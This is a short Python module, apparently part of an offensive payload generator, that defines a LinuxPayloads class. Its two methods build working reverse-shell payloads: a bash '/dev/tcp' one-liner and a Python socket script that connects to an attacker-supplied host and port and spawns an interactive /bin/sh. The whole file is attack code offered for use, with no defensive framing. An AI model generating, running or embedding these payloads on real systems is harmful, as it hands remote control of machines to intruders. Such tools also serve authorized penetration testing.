#!/usr/bin/env python3
"""
Linux Payload Modules
"""

class LinuxPayloads:
    def reverse_bash(self, lhost, lport, options=None):
        """Linux Reverse Bash Shell"""
        if options is None:
            options = {}
        
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        return payload
    
    def reverse_python(self, lhost, lport, options=None):
        """Python Reverse Shell"""
        if options is None:
            options = {}
        
        payload = f"""
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""
        return payload